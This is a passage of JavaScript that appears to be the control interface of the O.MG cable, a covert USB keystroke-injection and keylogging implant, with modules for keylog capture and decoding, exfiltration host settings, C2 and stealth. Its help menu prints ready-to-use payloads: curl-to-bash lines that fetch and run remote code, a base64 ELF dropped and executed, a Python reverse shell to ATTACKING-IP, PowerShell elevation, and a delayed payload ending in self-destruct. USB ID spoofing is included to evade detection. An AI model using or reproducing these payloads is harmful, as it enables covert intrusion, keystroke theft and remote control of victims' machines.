			document.getElementById('keylogStorageUsedBar').style.width = keylogStoragePercent;
			document.getElementById('keylogStoragePercent').innerHTML = keylogStoragePercent;

			logMessage('CRIT', `apiResponseCLStatus: [status]:[${keylogValues['keylogger-Status']}] [captureMode]:[${keylogValues['keylogger-CaptureMode']}] [spaceUsed]:[${keylogValues['keylogger-SpaceUsed']}] [spaceFree]:[${keylogValues['keylogger-SpaceFree']}] [dataWaiting]:[${keylogValues['keylogger-DataWaiting']}] [overflowCount]:[${keylogValues['keylogger-OverflowCount']}] [lastReportID]:[${keylogValues['keylogger-LastReportID']}] [nextReportID]:[${keylogValues['keylogger-NextReportID']}]`);

			updateKeylogStatus(keylogValues);
		}

		function apiResponseCLStop(data) {
			handleapiResponse(data, ELEMENT_IDS.RESPONSE_CL_STOP, 'buttonSelected');
			sendMessage("CLStatus");
		}

		function apiResponseCLStart(data) {
			handleapiResponse(data, ELEMENT_IDS.RESPONSE_CL_START, 'buttonSelected');
			sendMessage("CLStatus");
		}

		function apiResponse(data) {
			let response = convertUint8ArrayToString(data);
			let parameters = splitResponseIntoParameters(response);
			let cmd = parameters[0];
			logMessage(cmd.includes("Error") ? `INFO` : `CRIT`, `apiResponse${cmd}: [data]:[${response}]`);
			setElementValue(`response-${cmd}`, response);
		}

		function apiRequestCLRead(data, hex) {
			responseTextParams = data.split("\t");
			let clReadTemp = "";
			for (let i = 0; i < responseTextParams[4].length; i++) {
				clReadTemp += responseTextParams[4].charCodeAt(i).toString(16).padStart(2, '0');
			}
			for (let i = 0; i < clReadTemp.length; i += 4) {
				let hex = clReadTemp.substr(i, 4);
				logMessage(`INFO`, `!!! CLReadSplitter: [hex]:[${hex}]`);
				if (responseTextParams[1] == "K") {
					keylogDecoder(hex);
				} else if (responseTextParams[1] == "H") {
					document.getElementById("keylog").append(`${hex}`);
				}
			}
			logMessage(`INFO`, `CLRead Handler: [${evt.data}] [${responseTextParams[5]}] [${clReadTemp}]`)
			apiResponseCLRead(evt.data);
		}

		function apiResponseCLRead(data) {
			let parameter2 = "";
			for (let i = 0; i < data.length; i++) {
				parameter2 += data.charCodeAt(i).toString(16);
			}
			let response = String.fromCharCode.apply(null, new Uint8Array(data));
			let output = document.getElementById('response-CLRead');
			output.value = `${parameter2}`;
			logMessage(`INFO`, `apiResponseCLRead: [data]:[${response}] [data]:[${parameter2}]`);
		}

		function keylogStartStop(mode) {
			const footerNavKeylogStatus = document.getElementById('footerNavKeylogStatus');

			if (!mode) {
				mode = footerNavKeylogStatus.classList.contains('buttonSelected') ? 'off' : 'on';
			}

			if (keylogStatus == '1' || mode == 'off') {
				footerNavKeylogStatus.classList.remove('buttonSelected');
				const output = document.getElementById('keylogStartButton');
				output.innerHTML = 'Start';
				sendMessage('CLStop');
			} else if (keylogStatus == '0' || mode == 'on') {
				footerNavKeylogStatus.classList.add('buttonSelected');
				const output = document.getElementById('keylogStartButton');
				output.innerHTML = 'Stop';
				sendMessage('CLStart\tk');
			}
		}

		let intervalId = null;

		function liveLog(mode) {
			liveLogStatus = document.getElementById('keylogger-LiveLogStatus').value;

			if (!mode) {
				mode = liveLogStatus == 'on' ? 'off' : 'on';
			}

			const output = document.getElementById('keylogger-LiveLogStatus');
			const footerNavKeylogLiveStatus = document.getElementById('footerNavKeylogLiveStatus');

			if (mode == "on") {
				output.value = 'on';
				footerNavKeylogLiveStatus.classList.add('buttonSelected');

				intervalId = setInterval(function() {
					sendMessage('CLRead\t500');
				}, 2000);

			} else if (mode == "off") {
				output.value = 'off';
				footerNavKeylogLiveStatus.classList.remove('buttonSelected');

				if (intervalId) {
					clearInterval(intervalId);
					intervalId = null;
				}
			}
		}

		function keylogToPayloadConverter() {
			const keylogElement = document.getElementById("keylog");
			const payloadElement = document.getElementById("payload");
			const inputCache = keylogElement.value;
			let keylog = keylogElement.value;

			const regexes = [{
					pattern: /\[((LEFT|RIGHT)-(CTRL|ALT|GUI))\](.)\[\/((LEFT|RIGHT)-(CTRL|ALT|GUI))\]/g,
					replaceWith: '$3 $4\r\n'
				},
				{
					pattern: /\[((LEFT|RIGHT)-(SHIFT))\](.)\[\/((LEFT|RIGHT)-(SHIFT))\]/g,
					replaceWith: '$4'
				},
				{
					pattern: /\[(F[0-9]*|MEDIA*|KPAD*|INT*|LANG*|VOLUME*|AGAIN|ALTERASE|BACKSPACE|CANCEL|CAPSLOCK|CLEAR|COMPOSE|COPY|CRSEL|CUT|DELETE|DOWNARROW|END|ENTER|ESC|EXSEL|FIND|FRONT|HANGEUL|HANJA|HELP|HENKAN|HIRAGANA|HOME|INSERT|KATAKANA|KATAKANAHIRAGANA|KPAD_COMMA|KPAD_EQUAL|KPEQUAL|KPJPCOMMA|LEFTARROW|LOCKING_CAPSLOCK|LOCKING_NUMLOCK|LOCKING_SCROLLLOCK|MUHENKAN|MUTE|NUMLOCK|OPEN|OPER|OUT|PAGEDOWN|PAGEUP|PASTE|PAUSE|POWER|PRINTSCREEN|PRIOR|PROPS|RETURN|RIGHTARROW|RO|SCROLLLOCK|SEPARATOR|STOP|SYSREQ|TAB|UNDO|UPARROW|VOLUMEDOWN|VOLUMEUP|YEN|ZENKAKUHANKAKU)\]/g,
					replaceWith: '\r\n$1\r\n'
				}
			];

			regexes.forEach(({
				pattern,
				replaceWith
			}) => {
				keylog = keylog.replace(pattern, replaceWith);
			});

			logMessage('CRIT', `keylogToPayload: [input]:[${inputCache}] [keylog]:[${keylog}]`);

			payloadElement.value = keylog;
			contentAreaToggle('payload');
		}


		function decodeKeylog(hexData) {
			const pairs = hexData.match(/../g);

			let output = "";
			for (let i = 0; i < pairs.length; i += 2) {
				const mod = parseInt(pairs[i], 16);
				const key = pairs[i + 1];

				let binaryMod = parseInt(mod, 16);
				let layer = 0;
				if ((binaryMod & 0x02) !== 0 || (binaryMod & 0x20) !== 0) layer = 1;
				if ((binaryMod & 0x40) !== 0 && (binaryMod & 0x02) === 0 && (binaryMod & 0x20) === 0) layer = 2;
				if ((binaryMod & 0x40) !== 0 && ((binaryMod & 0x02) !== 0 || (binaryMod & 0x20) !== 0)) layer = 3;

				let modText = "";
				for (let m in modifiersInverted) {
					if (mod & m) modText += (modText ? '+' : '') + modifiersInverted[m];
				}

				let keyVal = positionalIds.includes(key) ? keymapData[key][layer] : keymapData[key];
				if (keyVal == "SPACE") {
					keyVal = " ";
				} else if (keyVal === undefined) {
					keyVal = `[UNDEFINED:${mod}:${key}]`;
				}

				if (keyVal != "NOKEY") {
					output += modText ? `[${modText}]${keyVal}[/${modText}]` : keyVal;
				}
			}

			document.getElementById("keylog").append(`${output}`);
		}

		const keylogDecoderCache = {};

		function keylogDecoder(data) {
			if (keylogDecoderCache[data]) {
				return keylogDecoderCache[data];
			}
			const mod = data.substr(0, 2);
			const hid = data.substr(2, 2);
			const modifierText = buildModifierText(mod);
			const key = getKeyFromHID(hid, modifierText.includes("SHIFT"));
			const finalKey = (modifierText !== "" && hid !== "00") ? `[${modifierText}]${key}[/${modifierText}]` : key;
			keylogDecoderCache[data] = finalKey;
			document.getElementById("keylog").append(finalKey);
			logMessage('DEBUG', `keylogDecoder: [data]:[${data}] [modifier]:[${mod}]:[${modifierText}] [hid]:[${hid}]:[${finalKey}]`);
			return finalKey;
		}

		function keylogOptionsMenu() {
			toggleModule('keylogOptionsMenu');
		}

		function downloadKeylog(data) {
			if (data == "1") {
				next = "1";
			} else {
				next = data[3];
				keylogData = data.join('09').split(':hexData:');
				keylogData = keylogData[1];
				decodeKeylog(keylogData);
			}
			next = padInput(next, "6");
			if (next == "000001") {
				output = document.getElementById('keylog');
				output.innerHTML = ``;
			}
			keyloggerSpaceUsed = document.getElementById('keylogger-SpaceUsed').value;
			spaceUsed = keyloggerSpaceUsed;
			if (spaceUsed == "10") {
				logMessage(`INFO`, `Keylog is Empty. [spaceUsed]:[${spaceUsed}] [readNext]:[${next}]`, `Keylog is Empty.`);
			} else if (spaceUsed == "NaN") {
				setInterval(function() {
					downloadKeylog(next);
				}, 1000);
			} else {
				if ((parseInt(spaceUsed) > parseInt(next)) && data[2] != "0000") {
					logMessage(`INFO`, `downloadKeylog: [spaceUsed]:[${spaceUsed}] [readNext]:[${next}]`);
					sendMessage(`[dKAll]CLRead\t300\t${String(next)}`);
				} else {
					logMessage(`INFO`, `downloadKeylog else: [spaceUsed]:[${spaceUsed}] [readNext]:[${next}]`);
				}
			}
		}

		// HIDX Module
		function apiResponseCHStart(data) {
			const {
				response,
				parameters
			} = parseData(data);
			logMessage(`CRIT`, `CHStart: [data]:[${response}]`);

			if (CHStatus === 1) {
				document.getElementById(`hidxstatusfile`).classList.remove('active');
				document.getElementById(`hidxstatustcp`).classList.add('active');
			} else if (CHStatus === 2) {
				document.getElementById(`hidxstatusfile`).classList.add('active');
				document.getElementById(`hidxstatustcp`).classList.remove('active');
			} else {
				document.getElementById(`hidxstatusfile`).classList.remove('active');
				document.getElementById(`hidxstatustcp`).classList.remove('active');
			}
		}

		function apiResponseCHStatus(data) {
			const {
				response,
				parameters
			} = parseData(data);
			logMessage(`CRIT`, `CHStatus: [data]:[${response}]`);

			const regex = /CH Mode: (\d+)/;
			const match = response.match(regex);

			let CHStatus;
			if (match) {
				CHStatus = parseInt(match[1], 10);
			}

			if (CHStatus === 1) {
				document.getElementById(`hidxstatusfile`).classList.remove('active');
				document.getElementById(`hidxstatustcp`).classList.add('active');
			} else if (CHStatus === 2) {
				document.getElementById(`hidxstatusfile`).classList.add('active');
				document.getElementById(`hidxstatustcp`).classList.remove('active');
			} else {
				document.getElementById(`hidxstatusfile`).classList.remove('active');
				document.getElementById(`hidxstatustcp`).classList.remove('active');
			}
		}

		function updateHIDXSettings() {
			cmd = `CTSet\thidxhost\t${document.getElementById("hidxhost").value}`;
			sendMessage(cmd);
			cmd = `CTSet\thidxport\t${document.getElementById("hidxport").value}`;
			sendMessage(cmd);
			if (document.getElementById(`hidxboot`).classList.contains('active')) {
				cmd = `CTSet\thidxboot\t1`;
			} else {
				cmd = `CTSet\thidxboot\t0`;
			}
			sendMessage(cmd);
		}

		// C2 Module
		function updateC2Settings() {
			cmd = `C2Config\t${document.getElementById("c2config").value}`;
			sendMessage(cmd);
		}

		function apiResponseC2Config(data) {
			const {
				response,
				parameters
			} = parseData(data);

			logMessage(`CRIT`, `apiResponseC2Config: [data]:[${data}]`);
			output = document.getElementById(`response-C2Config`);
			output.value = data;

			document.getElementById(`c2configApplied`).innerHTML = parameters[1];
			sendMessage(`CTSet\tc2boot\t1`);
		}

		let prevDataC2Info = null;

		function apiResponseC2Info(data) {
			if (data === prevDataC2Info) {
				return;
			}
			prevDataC2Info = data;

			const {
				response,
				parameters
			} = parseData(data);

			logMessage(`CRIT`, `apiResponseC2Info: [data]:[${data}]`);
			output = document.getElementById(`response-C2Info`);
			output.value = data;
		}

		let prevDataC2Status = null;

		function apiResponseC2Status(data) {
			if (data === prevDataC2Status) {
				return;
			}
			prevDataC2Status = data;

			const {
				response,
				parameters
			} = parseData(data);

			logMessage(`CRIT`, `apiResponseC2Status: [data]:[${data}]`);
			output = document.getElementById(`response-C2Status`);
			output.value = data;

			if (parameters[1] == "stopped" || parameters[1] == "noprov") {
				document.getElementById(`c2status`).classList.remove(`active`);
			} else {
				document.getElementById(`c2status`).classList.add('active');
			}
			if (parameters[1] !== "noprov") {
				document.getElementById(`button-C2Wipe`).classList.remove(`hidden`);
				document.getElementById(`c2configApplied`).innerHTML = "Provisioned: " + parameters[1];
			} else {
				document.getElementById(`c2configApplied`).innerHTML = parameters[1];
			}
		}

		function apiResponseC2Wipe(data) {
			const {
				response,
				parameters
			} = parseData(data);

			logMessage(`CRIT`, `apiResponseC2Wipe: [data]:[${data}]`);
			output = document.getElementById(`response-C2Wipe`);
			output.value = data;
		}

		// Stealth Module
		function apiResponseCU(data) {
			const {
				response,
				parameters
			} = parseData(data);

			function setElementValue(id, value) {
				const element = document.getElementById(id);
				if (element) {
					element.value = value;
				}
			}

			logMessage(`CRIT`, `apiResponseCU: [data]:[${response}]`);
			setElementValue('response-CU', response);
		}

		// About Menu Module
		const releaseTeam = [{
				"name": "Kalani",
				"twitter": "KalaniMakutu",
				"role": "Application"
			},
			{
				"name": "MG",
				"twitter": "_MG_",
				"role": "Hardware"
			},
			{
				"name": "1phor1",
				"twitter": "01p8or13",
				"role": "Tools & Testing"
			},
			{
				"name": "r3dct3d",
				"twitter": "r3dct3d",
				"role": "Firmware / Keylogger"
			},
			{
				"name": "RoganDawes",
				"twitter": "RoganDawes",
				"role": "Researcher @sensepost"
			},
			{
				"name": "Troy",
				"twitter": "waveguyd",
				"role": "RF / Antenna"
			},
			{
				"name": "Wasabi",
				"twitter": "spiceywasabi",
				"role": "Tooling & Infrastructure"
			},
		];

		function generateReleaseTeam() {
			logMessage(`DEBUG`, `generateReleaseTeam`);
			const releaseTeamContainer = document.getElementById("releaseTeam");
			releaseTeamContainer.innerHTML = "";

			releaseTeam.forEach((member) => {
				const teamMemberElement = createTeamMemberElement(member);
				releaseTeamContainer.appendChild(teamMemberElement);
			});

			if (releaseTeam.length % 2 !== 0) {
				const spacer = document.createElement('br');
				spacer.className = 'team-member-container';
				releaseTeamContainer.appendChild(spacer);
			}
		}

		function createTeamMemberElement(member) {
			const container = document.createElement("div");
			container.className = "team-member-container";

			const name = document.createElement("div");
			name.className = "about-team-name";
			name.textContent = member.name;
			container.appendChild(name);

			const twitter = document.createElement("div");
			const twitterLink = document.createElement("a");
			twitter.className = "about-twitter";
			twitterLink.setAttribute("href", `https://twitter.com/${member.twitter}`);
			twitterLink.textContent = "@" + member.twitter;
			twitter.appendChild(twitterLink);
			container.appendChild(twitter);

			const role = document.createElement("div");
			role.className = "about-role";
			role.textContent = member.role;
			container.appendChild(role);

			return container;
		}

		function createRegulatory() {
			createDialog({
				id: 'regulatory',
				title: 'Regulatory Info',
				description: `<h2 id="fccID">${fccID}</h2>
					<p>This device complies with Part 15 of the FCC Rules. Operation is subject to the following two conditions: (1) this device may not cause harmful interference, and (2) this device must accept any interference received, including interference that may cause undesired operation. Warning (Part 15.21) Changes or modifications not expressly approved by the party responsible for compliance could void the users authority to operate the equipment.</p>
					<p>RF Exposure (OET Bulletin 65) To comply with FCC RF exposure requirements for mobile transmitting devices, this transmitter should only be used or installed at locations where there is at least 20cm separation distance between the antenna and all persons.</p>
					<p>Information to the User - Part 15.105 (b) Note: This equipment has been tested and found to comply with the limits for a Class B digital device, pursuant to part 15 of the FCC Rules. These limits are designed to provide reasonable protection against harmful interference in a residential installation. This equipment generates, uses and can radiate radio frequency energy and, if not installed and used in accordance with the instructions, may cause harmful interference to radio communications. However, there is no guarantee that interference will not occur in a particular installation. If this equipment does cause harmful interference to radio or television reception, which can be determined by turning the equipment off and on, the user is encouraged to try to correct the interference by one or more of the following measures:</p>
					<p>
						* Reorient or relocate the receiving antenna.
						<br>
						* Increase the separation between the equipment and receiver.
						<br>
						* Connect the equipment into an outlet on a circuit different from that to which the receiver is connected.
						<br>
						* Consult the dealer or an experienced radio/TV technician for help.
					</p>`,
				closeEnabled: true,
			});
		}

		// Help Menu Module
		const helpElementIds = [
			"helppayloadExample",
			"helppayloadUSBIDs",
			"helppayload",
			"helpkeylog",
			"helppayloadGeofencing",
			"helpselfDestruct",
			"helpglobalKeys"
		];

		let helpMenuItems = [{
			"feat": "payloadExample",
			"name": "MacOS Payload Combo",
			"desc": "On a macOS system, open a Terminal, download the contents of a file posted on pastebin, and execute its contents.",
			"code": [{
				example: 'REM To avoid "new keyboard" pop up, update the VID/PID to your target environment. https://usb-ids.gowdy.us/read/UD/\nVID 1337\nPID C0D3\nGUI SPACE\nDELAY 1000\nSTRING Terminal\nENTER\nDELAY 1\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Linux Payload Combo",
			"desc": "On a Linux system, open a Terminal, download the contents of a file posted on pastebin, and execute its contents.",
			"code": [{
				example: 'VID 1337\nPID C0D3\nGUI\nDELAY 1000\nSTRING Terminal\nENTER\nDELAY 5000\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Linux Netspooky B64 Combo",
			"desc": "On a Linux system, open a Terminal, decode a base64 string, save to a file, set as executable, and run the file.",
			"code": [{
				example: 'GUI\nSTRING Terminal\nENTER\nDELAY 3000\nSTRING base64 -d <<< f0VMRgIBAQCwPEgx/w8FAAIAPgABAAAACABAAAAAAABAAAAAAAAAAFABAAAAAAAAAAAAAEAAOAABAEAABQAEAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAewAAAAAAAAB7AAAAAAAAAAAAIAAAAAAA >s;chmod +x s;./s\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Linux Boot Jiggle Payload Suicide",
			"desc": "On a Linux system, start the Mouse Jiggler, wait for 40 minutes, and then open a Terminal, download the contents of a file from pastebin, and execute its contents, then perform a Self Destruct on the O.MG Device.",
			"code": [{
				example: 'JIGGLER ON\nDELAY 240000\nGUI\nDELAY 1\nSTRING Terminal\nENTER\nDELAY 5000\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER\nSELF-DESTRUCT'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Linux Reverse Shell Python",
			"desc": "On a Linux system, open a Terminal, and using Python create a reverse shell.",
			"code": [{
				example: 'GUI\nSTRING Terminal\nENTER\nDELAY 3000\nSTRING python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\"\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Win10 Admin PowerShell Enable PS1 Scripts",
			"desc": "On a Windows system, open Powershell and set the execution policy to allow *.ps1 scripts.",
			"code": [{
				example: 'GUI r\nDELAY 2000\nSTRING PowerShell\nDELAY 1\nENTER\nDELAY 2000\nSTRING Start-Process PowerShell -Verb RunAs\nDELAY 1000\nENTER\nDELAY 1000\nLEFT\nENTER\nDELAY 3000\nSTRING Set-ExecutionPolicy RemoteSigned\nDELAY 2000\nENTER\nSTRING A\nDELAY 2000\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Win10 PowerShell",
			"desc": "On a Windows system, open PowerShell.",
			"code": [{
				example: 'GUI r\nDELAY 1000\nSTRING PowerShell\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Win10 1",
			"desc": "On a Windows system, download the contents of a file posted on pastebin, and execute its contents.",
			"code": [{
				example: 'STRING wget pastebin.com/raw/CR8QprvH -Outfile y.ps1\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Win10 2",
			"desc": "On a Windows system, print the string 'rekt'",
			"code": [{
				example: 'STRING $x=echo rekt\nENTER\nSTRING $x\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Win10 Combo",
			"desc": "On a Windows system, open Powershell and print the string 'rekt'",
			"code": [{
				example: 'VID 1337\nPID C0D3\nGUI r\nDELAY 1000\nSTRING PowerShell\nENTER\nDELAY 5000\nSTRING $x=echo rekt\nENTER\nSTRING $x\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Check wifi for target location",
			"desc": "Use the GeoFencing Module to detect if a WiFi Network is present, and if so print a string on the target.",
			"code": [{
				example: 'VID 1337\nPID C0D3\nSTRING Checking if cable is still in the target location...\nENTER\nIF_PRESENT SSID="TargetSSID"\nSTRING Cable looks to be at the target location, it\'s safe to run the payload!\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Check wifi for safe location",
			"desc": "Use the GeoFencing Module to detect if a WiFi network is not present, and if so print a string on the target.",
			"code": [{
				example: 'VID 1337\nPID C0D3\nSTRING Checking if cable is in the off limits location before running payload...\nENTER\nIF_NOTPRESENT SSID="OffLimitsSSID"\nSTRING If this is being typed, it means the OffLimitsSSID as not seen!\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "MacOS Text-to-Speech Example",
			"desc": "On macOS, Launch terminal and use the command 'say' to read out a string.",
			"code": [{
				example: 'DELAY 200\nGUI SPACE\nDELAY 200\nSTRING Terminal\nENTER\nDELAY 200\nSTRING say "We have been trying to reach you concerning your vehicles extended warranty. You should have received a notice in the mail about your cars extended warranty eligibility. Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicles warranty, press 1 to speak with a warranty specialist."\nENTER'
			}]
		}, {
			"feat": "payloadExample",
			"name": "Windows Text-to-Speech Example",
			"desc": "On Windows, Launch Powershell and use the System.speech to read out a string.",
			"code": [{
				example: 'DELAY 200\nGUI r\nDELAY 200\nSTRING Powershell\nENTER\nDELAY 200\nSTRING Add-Type -AssemblyName System.speech\nENTER\nSTRING $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\nENTER\nSTRING $speak.Speak("We have been trying to reach you concerning your vehicles extended warranty. You should have received a notice in the mail about your cars extended warranty eligibility. Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicles warranty, press 1 to speak with a warranty specialist.")\nENTER'
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "VID",
			"desc": "Set Vendor ID",
			"code": [{
				"example": "VID 1234"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "PID",
			"desc": "Set Product ID",
			"code": [{
				"example": "PID ABCD"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "MAN",
			"desc": "Set iManufacturer descriptor (length 40)",
			"code": [{
				"example": "MAN O.MG"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "PRO",
			"desc": "Set iProduct descriptor (length 40)",
			"code": [{
				"example": "PRO O.MG-CABLE"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "SER",
			"desc": "Set iSerial descriptor (length 40)",
			"code": [{
				"example": "SER 0123456789"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "VID_RANDOM",
			"desc": "Set Vendor ID to a random 4-digit HEX Value",
			"code": [{
				"example": "VID_RANDOM"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "PID_RANDOM",
			"desc": "Set Product ID to a random 4-digit HEX Value",
			"code": [{
				"example": "PID_RANDOM"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "MAN_RANDOM",
			"desc": "Set iManufacturer descriptor to a random plausible string",
			"code": [{
				"example": "MAN_RANDOM"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "PRO_RANDOM",
			"desc": "Set iProduct descriptor to a random plausible string",
			"code": [{
				"example": "PRO_RANDOM"
			}]
		}, {
			"feat": "payloadUSBIDs",
			"name": "SER_RANDOM",
			"desc": "Set iSerial descriptor to a random plausible string",
			"code": [{
				"example": "SER_RANDOM"
			}]
		}, {
			"feat": "payload",
			"name": "STRING",
			"desc": "Type a sequence of letter",
			"code": [{
				"example": "STRING Hello World!"
			}]
		}, {
			"feat": "payload",
			"name": "STRINGLN",
			"desc": "Type a sequence of letter, followed by ENTER",
			"code": [{
				"example": "STRINGLN Hello World!"
			}]
		}, {
			"feat": "payload",
			"name": "REM",
			"desc": "Comment. This line will be removed by the compiler.",
			"code": [{
				"example": "REM Hello World!"
			}]
		}, {
			"feat": "payload",
			"name": "REM_BLOCK",
			"desc": "Comment. This block will be removed by the compiler.",
			"code": [{
				"example": "REM_BLOCK Hello,\n World!\nEND_REM"
			}]
		}, {
			"feat": "payload",
			"name": "RANDOM_LOWERCASE_LETTER",
			"desc": "Type a single random character from the set: abcdefghijklmnopqrstuvwxyz",
			"code": [{
				"example": "RANDOM_LOWERCASE_LETTER"
			}]
		}, {
			"feat": "payload",
			"name": "RANDOM_UPPERCASE_LETTER",
			"desc": "Type a single random character from the set: ABCDEFGHIJKLMNOPQRSTUVWXYZ",
			"code": [{
				"example": "RANDOM_UPPERCASE_LETTER"
			}]
		}, {
			"feat": "payload",
			"name": "RANDOM_LETTER",
			"desc": "Type a single random character from the set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
			"code": [{
				"example": "RANDOM_LETTER"
			}]
		}, {
			"feat": "payload",
			"name": "RANDOM_NUMBER",
			"desc": "Type a single random character from the set: 0123456789",
			"code": [{
				"example": "RANDOM_NUMBER"
			}]
		}, {
			"feat": "payload",
			"name": "RANDOM_SPECIAL",
			"desc": "Type a single random character from the set: !@#$%^&*()",
			"code": [{
				"example": "RANDOM_SPECIAL"
			}]
		}, {
			"feat": "payload",
			"name": "RANDOM_CHAR",
			"desc": "Type a single random character from the set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()",
			"code": [{
				"example": "RANDOM_CHAR"
			}]
		}, {
			"feat": "payload",
			"name": "FUNCTION",
			"desc": "FUNCTION is a block of code that can be ran via a single reference, with optional DEFINE constants provided as parameters. One may consider the use of a FUNCTION within a payload like a find-and-replace at time of compile.",
			"code": [{
					"example": "FUNCTION functionName()\nSTRING Hello, World!\nEND_FUNCTION"
				},
				{
					"example": "FUNCTION launchApp(#VAR1, #VAR2)\nGUI SPACE\nSTRING #VAR1\nENTER\nGUI f\nSTRING #VAR2\nEND_FUNCTION"
				},
				{
					"example": "launchApp(Safari, www.google.com)"
				}
			]
		}, {
			"feat": "payload",
			"name": "DEFINE",
			"desc": "DEFINE a constant. One may consider the use of a DEFINE within a payload like a find-and-replace at time of compile.",
			"code": [{
					"example": "DEFINE #WAIT 2000"
				},
				{
					"example": "DEFINE #TEXT Hello World"
				},
				{
					"example": "DEFINE #MYURL example.com"
				},
				{
					"example": "DELAY #WAIT"
				},
				{
					"example": "STRINGLN #TEXT"
				},
				{
					"example": "STRING https://#MYURL"
				},
			]
		}, {
			"feat": "payload",
			"name": "REPEAT",
			"desc": "Repeat the following command n-times.",
			"code": [{
				"example": "REPEAT 5 STRINGLN Test"
			}]
		}, {
			"feat": "payload",
			"name": "MOUSE",
			"desc": "Emulate a mouse via DuckyScript. In the below code example, the mouse will move to the probable 0x0 coordinate, move left 200, move down 30, click the left mouse button. By default, buttons are: 1 = Left Click, 2 = Middle, 3 = Right, 4 = Scroll Up, 5 = Scroll Down, 6 = Back, 7 = Forward",
			"code": [{
					"example": "MOUSE MOVE [X: +/- INTEGER] [Y: +/- INTEGER]"
				},
				{
					"example": "MOUSE CLICK [MOUSE BUTTON NUMBER 1-15]"
				},
				{
					"example": "MOUSE MOVE -10000 -10000"
				},
				{
					"example": "MOUSE MOVE 200 30"
				},
				{
					"example": "MOUSE CLICK 1"
				}
			]
		}, {
			"feat": "payload",
			"name": "USB",
			"desc": "Turn USB on/off (enumerate the implant as a USB device to the host)",
			"code": [{
					"example": "USB ON"
				},
				{
					"example": "USB OFF"
				}
			]
		}, {
			"feat": "payload",
			"name": "USB_RESET",
			"desc": "Reset the USB Interface, casuing it to re-enumerate the implant as a USB device to the host.",
			"code": [{
				"example": "USB_RESET"
			}]
		}, {
			"feat": "payload",
			"name": "JIGGLER",
			"desc": "Turn mouse jiggler on or off. This will move the mouse randomly one pixel left or right every 25 seconds to keep the screen lock feature of the os from turning on.",
			"code": [{
					"example": "JIGGLER ON"
				},
				{
					"example": "JIGGLER OFF"
				}
			]
		}, {
			"feat": "keylog",
			"name": "KEYLOGGER",
			"desc": "Turn keylogger on or off. By default, the keylogging mode is Keystroke.",
			"code": [{
					"example": "KEYLOGGER ON"
				},
				{
					"example": "KEYLOGGER ON KEY"
				},
				{
					"example": "KEYLOGGER ON HID"
				},
				{
					"example": "KEYLOGGER OFF"
				}
			]
		}, {
			"feat": "payload",
			"name": "REBOOT",
			"desc": "Reboot backend cable firmware",
			"code": [{
				"example": "REBOOT"
			}]
		}, {
			"feat": "payload",
			"name": "CAPSLOCK_DISABLE",
			"desc": "Check if CAPSLOCK is on. If so, toggle off for the duration of payload. On completion, return to previous state.",
			"code": [{
				"example": "CAPSLOCK_DISABLE"
			}]
		}, {
			"feat": "payload",
			"name": "DELAY",
			"desc": "Delay for a number of milliseconds",
			"code": [{
				"example": "DELAY 500"
			}]
		}, {
			"feat": "payload",
			"name": "DEFAULT_DELAY",
			"desc": "Add an automatic DELAY preceeding each command for a number of milliseconds",
			"code": [{
				"example": "DEFAULT_DELAY 500"
			}]
		}, {
			"feat": "payload",
			"name": "DEFAULT_DELAY_JITTER",
			"desc": "Take the value from DEFAULT_DELAY and select a random number between 0 and the value specified. The result is added to the DEFAULT_DELAY in milliseconds",
			"code": [{
				"example": "DEFAULT_DELAY_JITTER 500"
			}]
		}, {
			"feat": "payload",
			"name": "DEFAULT_CHAR_DELAY",
			"desc": "Add an automatic DELAY between each STRING character for a number of milliseconds",
			"code": [{
				"example": "DEFAULT_CHAR_DELAY 500"
			}]
		}, {
			"feat": "payload",
			"name": "DEFAULT_CHAR_DELAY_JITTER",
			"desc": "Take the value from DEFAULT_CHAR_DELAY and select a random number between 0 and the value specified. The result is added to the DEFAULT_CHAR_DELAY in milliseconds",
			"code": [{
				"example": "DEFAULT_CHAR_DELAY_JITTER 500"
			}]
		}, {
			"feat": "payload",
			"name": "DUCKY_LANG",
			"desc": `Specify Language Keymap used during payload execution. Available keymaps: ${keymapListPretty}`,
			"code": [{
					"example": "DUCKY_LANG US"
				},
				{
					"example": "DUCKY_LANG FR"
				}
			]
		}, {
			"feat": "payloadGeofencing",
			"name": "IF_PRESENT",
